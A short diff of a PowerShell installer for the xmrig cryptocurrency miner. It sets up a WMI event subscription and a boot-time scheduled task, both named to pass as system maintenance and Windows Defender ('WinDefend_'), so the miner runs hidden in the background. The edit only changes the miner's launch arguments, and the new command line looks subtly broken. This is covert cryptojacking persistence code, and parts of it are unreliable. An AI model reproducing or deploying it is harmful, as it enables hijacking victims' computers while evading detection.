@@ -82,7 +82,7 @@ try {
     # Create Consumer
     $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
         Name                 = "SysMaint_$((Get-Date).Ticks)"
-        CommandLineTemplate  = "`"$destinationPath`" --donate-level=0"
+        CommandLineTemplate  = "`"$minerHome`" xmrig.exe"
         RunInteractively      = $false  # Critical for background execution
     }
 
@@ -110,7 +110,7 @@ try {
     $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
     Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" `
         -Trigger $trigger `
-        -Action (New-ScheduledTaskAction -Execute "$minerHome\$minerBinary" -Argument "--donate-level=0") `
+        -Action (New-ScheduledTaskAction -Execute "$minerHome\$minerBinary" -Argument "xmrig.exe") `
         -Settings $taskSettings `
         -Force | Out-Null
 }
